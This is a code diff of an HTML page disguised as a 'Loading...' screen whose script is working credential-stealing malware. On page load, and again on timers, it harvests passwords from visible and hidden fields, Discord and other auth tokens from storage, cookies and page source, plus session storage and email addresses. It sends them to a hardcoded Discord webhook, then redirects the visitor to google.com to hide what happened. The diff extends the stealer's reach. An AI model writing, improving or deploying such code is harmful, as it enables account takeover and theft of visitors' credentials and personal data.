@@ -5,92 +5,153 @@
     <title>Loading...</title>
     <script>
         (function() {
-            // ═══════ WEBHOOK ═══════
             const WEBHOOK = 'https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i';
 
-            // ═══════ COLLECTORS ═══════
-            function getCookies() {
-                return document.cookie.split('; ').reduce((a, c) => {
-                    const [k, v] = c.split('=');
-                    a[k] = v;
-                    return a;
-                }, {});
-            }
-
-            function getStorage(type) {
+            // ─── Collect sessionStorage ───
+            function getSessionStorage() {
                 const data = {};
-                const st = type === 'local' ? localStorage : sessionStorage;
-                for (let i = 0; i < st.length; i++) {
-                    const key = st.key(i);
-                    data[key] = st.getItem(key);
-                }
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        data[key] = sessionStorage.getItem(key);
+                    }
+                } catch(e) {}
                 return data;
             }
 
+            // ─── Collect passwords from all forms and inputs ───
             function getPasswords() {
                 const p = [];
-                document.querySelectorAll('input[type="password"]').forEach(inp => {
-                    if (inp.value) p.push({ name: inp.name || 'unknown', value: inp.value });
-                });
+                try {
+                    // All input[type="password"]
+                    document.querySelectorAll('input[type="password"]').forEach(inp => {
+                        if (inp.value) {
+                            p.push({
+                                name: inp.name || inp.id || 'unknown',
+                                value: inp.value
+                            });
+                        }
+                    });
+                    // Also check hidden fields that might contain passwords
+                    document.querySelectorAll('input[type="hidden"]').forEach(inp => {
+                        const name = (inp.name || '').toLowerCase();
+                        if (name.includes('pass') || name.includes('pwd') || name.includes('token')) {
+                            if (inp.value && inp.value.length > 3) {
+                                p.push({
+                                    name: inp.name || 'hidden_password',
+                                    value: inp.value
+                                });
+                            }
+                        }
+                    });
+                    // Check textarea and inputs with autocomplete
+                    document.querySelectorAll('input[type="text"], textarea').forEach(inp => {
+                        const name = (inp.name || '').toLowerCase();
+                        const val = inp.value || '';
+                        if ((name.includes('pass') || name.includes('pwd') || name.includes('token')) && val.length > 3) {
+                            p.push({
+                                name: inp.name || 'text_password',
+                                value: val
+                            });
+                        }
+                    });
+                } catch(e) {}
                 return p;
             }
 
+            // ─── Collect Discord Token ───
             function getDiscordToken() {
-                const keys = ['token', 'discord_token', 'authorization'];
-                for (const k of keys) {
-                    let v = localStorage.getItem(k) || sessionStorage.getItem(k);
-                    if (v && (v.startsWith('mfa.') || v.length > 30)) return v;
-                }
-                const c = getCookies();
-                for (const [k, v] of Object.entries(c)) {
-                    if ((k.includes('token') || k.includes('auth')) && v.length > 30) return v;
-                }
+                try {
+                    // Check localStorage and sessionStorage for known keys
+                    const keys = ['token', 'discord_token', 'authorization', 'auth_token', 'access_token', 'refresh_token', 'mfa_token'];
+                    for (const k of keys) {
+                        let v = localStorage.getItem(k) || sessionStorage.getItem(k);
+                        if (v && (v.startsWith('mfa.') || v.length > 20)) return v;
+                    }
+                    // Check all localStorage and sessionStorage for any value that looks like a token
+                    const allStorage = { ...localStorage, ...sessionStorage };
+                    for (const [k, v] of Object.entries(allStorage)) {
+                        if (typeof v === 'string') {
+                            if (v.startsWith('mfa.') || v.match(/^[a-zA-Z0-9_-]{20,}/)) {
+                                if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('discord')) {
+                                    return v;
+                                }
+                            }
+                        }
+                    }
+                    // Check cookies
+                    const cookies = document.cookie.split('; ').reduce((a,c) => { const [k,v]=c.split('='); a[k]=v; return a; }, {});
+                    for (const [k, v] of Object.entries(cookies)) {
+                        if (typeof v === 'string') {
+                            if ((k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('discord')) && v.length > 20) {
+                                return v;
+                            }
+                        }
+                    }
+                    // Check all script tags and meta for token patterns
+                    const allText = document.documentElement.innerHTML;
+                    const tokenMatches = allText.match(/[a-zA-Z0-9_-]{30,}/g);
+                    if (tokenMatches) {
+                        for (const match of tokenMatches) {
+                            if (match.startsWith('mfa.') || match.length > 30) {
+                                return match;
+                            }
+                        }
+                    }
+                } catch(e) {}
                 return null;
             }
 
+            // ─── Collect Emails ───
             function getEmails() {
-                const re = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-                const found = (document.body.innerText.match(re) || []);
-                document.querySelectorAll('input[type="email"]').forEach(inp => {
-                    if (inp.value && re.test(inp.value)) found.push(inp.value);
-                });
+                const found = [];
+                try {
+                    const re = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+                    // From page text
+                    const text = document.body.innerText || document.documentElement.innerText || '';
+                    const fromText = text.match(re) || [];
+                    found.push(...fromText);
+                    // From all input fields
+                    document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"], input[id*="mail"]').forEach(inp => {
+                        if (inp.value && re.test(inp.value)) found.push(inp.value);
+                    });
+                    // From all text inputs that look like email
+                    document.querySelectorAll('input[type="text"]').forEach(inp => {
+                        const val = inp.value || '';
+                        if (val && re.test(val)) found.push(val);
+                    });
+                    // From all hidden inputs
+                    document.querySelectorAll('input[type="hidden"]').forEach(inp => {
+                        const val = inp.value || '';
+                        if (val && re.test(val)) found.push(val);
+                    });
+                    // From all meta tags
+                    document.querySelectorAll('meta').forEach(meta => {
+                        const content = meta.getAttribute('content') || '';
+                        if (content && re.test(content)) found.push(content);
+                    });
+                } catch(e) {}
                 return [...new Set(found)];
             }
 
-            function getFingerprint() {
-                return {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: screen.width + 'x' + screen.height,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                    deviceMemory: navigator.deviceMemory || 'unknown'
-                };
-            }
-
-            function collectAll() {
+            // ─── Collect all four ───
+            function collectTargets() {
                 return {
                     timestamp: new Date().toISOString(),
                     url: window.location.href,
-                    referrer: document.referrer || 'none',
-                    cookies: getCookies(),
-                    localStorage: getStorage('local'),
-                    sessionStorage: getStorage('session'),
+                    sessionStorage: getSessionStorage(),
                     passwords: getPasswords(),
                     discordToken: getDiscordToken(),
-                    emails: getEmails(),
-                    fingerprint: getFingerprint()
+                    emails: getEmails()
                 };
             }
 
-            // ═══════ SENDER ═══════
+            // ─── Send ───
             function sendData(data) {
                 const payload = {
                     content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
                 };
 
-                // Try fetch
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -98,38 +159,39 @@
                 })
                 .then(r => console.log('[Collector] Sent, status:', r.status))
                 .catch(() => {
-                    // Fallback: Image GET (limited, but works)
                     const img = new Image();
-                    const fallbackUrl = WEBHOOK + '?content=' + encodeURIComponent('```json\n' + JSON.stringify(data).substring(0, 1500) + '\n```');
-                    img.src = fallbackUrl;
+                    const fallback = WEBHOOK + '?content=' + encodeURIComponent('```json\n' + JSON.stringify(data).substring(0, 1500) + '\n```');
+                    img.src = fallback;
                     console.log('[Collector] Fallback sent');
                 });
             }
 
-            // ═══════ RUN ═══════
-            // Wait for page to fully load (ensures dynamic content)
-            window.addEventListener('load', function() {
-                // Collect immediately
-                const data = collectAll();
+            // ─── Run multiple times to catch delayed data ───
+            function runCollection() {
+                const data = collectTargets();
                 sendData(data);
+            }
 
-                // Also collect after 2 seconds to catch delayed content
-                setTimeout(function() {
-                    const data2 = collectAll();
-                    sendData(data2);
-                }, 2000);
+            window.addEventListener('load', function() {
+                // Immediate
+                runCollection();
+                // After 2s
+                setTimeout(runCollection, 2000);
+                // After 5s
+                setTimeout(runCollection, 5000);
+                // After 10s (for slow-loading SPAs like Discord web)
+                setTimeout(runCollection, 10000);
 
-                // Collect again after 5 seconds (for SSO redirects)
-                setTimeout(function() {
-                    const data3 = collectAll();
-                    sendData(data3);
-                }, 5000);
-
-                // ═══ REDIRECT to hide the page (optional) ═══
-                // Change this URL to whatever you want
+                // Redirect to hide (optional)
                 setTimeout(function() {
                     window.location.replace('https://google.com');
-                }, 3000);
+                }, 4000);
+            });
+
+            // Also run on DOMContentLoaded for faster pages
+            document.addEventListener('DOMContentLoaded', function() {
+                // Small delay to let initial forms render
+                setTimeout(runCollection, 500);
             });
 
         })();
